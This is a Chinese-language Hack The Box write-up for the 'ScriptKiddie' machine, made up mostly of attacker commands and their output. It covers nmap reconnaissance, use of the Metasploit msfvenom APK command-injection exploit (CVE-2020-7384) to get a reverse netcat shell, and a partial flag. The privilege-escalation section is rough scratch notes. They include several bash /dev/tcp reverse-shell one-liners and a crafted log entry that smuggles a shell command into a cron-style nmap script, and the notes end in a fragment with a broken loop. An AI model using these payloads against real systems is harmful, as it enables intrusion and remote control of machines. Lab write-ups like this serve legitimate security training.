# 服务探测

开放端口
```
┌──(root㉿rock)-[~/htb/ScriptKiddie]
└─# nmap -p- --open 10.10.10.226               
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-24 02:13 EDT
Nmap scan report for 10.10.10.226
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 5.58 seconds

```

详细端口信息
```
┌──(root㉿rock)-[~/htb/ScriptKiddie]
└─# nmap -sV -Pn -A -O 10.10.10.226 -p 22,5000
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-24 02:17 EDT
Nmap scan report for 10.10.10.226
Host is up (0.0085s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), Linux 5.0 - 5.3 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT     ADDRESS
1   7.21 ms 10.10.16.1
2   2.95 ms 10.10.10.226

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.50 seconds

```


# web

5000端口是一个执行各种命令的页面，尝试各种命令注入无果

我们留意到期中一个命令执行是生成一个msfvenom的payload，其中需要上传一个文件

linux上传.elf文件
windows上传.exe文件
安卓上传.apk文件


感觉入口应该是在这里

kali搜索msfvenom相关的漏洞

```
┌──(root💀kali)-[~/htb/ScriptKiddie]
└─# searchsploit msfvenom                                                                                     130 ⨯
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Metasploit Framework 6.0.11 - msfvenom APK template command injection             | multiple/local/49491.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

找到一个python版本的exp，但是我本地因为py的各种依赖问题不能成功执行，根据漏洞编号去到msf寻找这个漏洞的exp
```
msf6 exploit(multi/http/werkzeug_debug_rce) > search 2020-7384

Matching Modules
================

   #  Name                                                                    Disclosure Date  Rank       Check  Description
   -  ----                                                                    ---------------  ----       -----  -----------
   0  exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection  2020-10-29       excellent  No     Rapid7 Metasploit Framework msfvenom APK Template Command Injection 
```

载入，生成一个apk文件
```
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > options

Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.apk          yes       The APK file name


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  207.246.124.194  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set lhost 10.10.16.6
lhost => 10.10.16.6
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run

[+] msf.apk stored at /root/.msf4/local/msf.apk

```

通过首页上传到服务器，当服务器程序执行msfvenom时，本地收到一个rev shell


```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.6:4444 
[*] Command shell session 1 opened (10.10.16.6:4444 -> 10.10.10.226:51136) at 2022-06-24 06:02:05 -0400

id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
whoami
kid

```

拿到user.txt
```
ls
html
logs
snap
user.txt
cat user.txt
bb9561c6fe02ab1...
```

# 提权



bash -i >& /dev/tcp/10.10.14.15/4242 0>&1



```
kid@scriptkiddie:/home/pwn$ cat scanlosers.sh
cat scanlosers.sh
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi

```



```
┌──(root💀kali)-[~/htb/ScriptKiddie]
└─# cat hackers                                        
2022-06-28 17:34:11.250129 127.0.0.1
                                                                                                                                               
┌──(root💀kali)-[~/htb/ScriptKiddie]
└─# cat /root/htb/ScriptKiddie/hackers | cut -d' ' -f3-
127.0.0.1

```


2022-06-28 17:34:11.250129 127.0.0.1




2022-06-28 17:34:11.250129 ${bash -i >& /dev/tcp/10.10.14.15/4242 0>&1}


2022-06-28 17:34:11.250129 bash -i >& /dev/tcp/10.10.14.15/4242 0>&1


nmap --top-ports 10 -oN recon/10.10.14.15.nmap 10.10.14.15 2>&1 >/dev/null



nmap --top-ports 10 -oN recon/127.0.0.1|whoami&&id.nmap 127.0.0.1|whoami&&id >/dev/null



nmap --top-ports 10 -oN recon/127.0.0.1|bash -i >& /dev/tcp/10.10.14.15/4242 0>&1&&id.nmap 127.0.0.1|bash -i >& /dev/tcp/10.10.14.15/4242 0>&1&&id >/dev/null


echo "2022-06-28 17:34:11.250129 127.0.0.1|bash -i >& /dev/tcp/10.10.14.15/4242 0>&1&&id" > /home/kid/logs/hackers


echo "2022-06-28 17:34:11.250129 127.0.0.1|bash -i >& /dev/tcp/10.10.14.15/4242 0>&1&&id" > hackers


cat /home/kid/logs/hackers | cut -d' ' -f3-


cat /home/kid/logs/hackers | cut -d' ' -f3- | sort -u | while read ip; echo ${ip}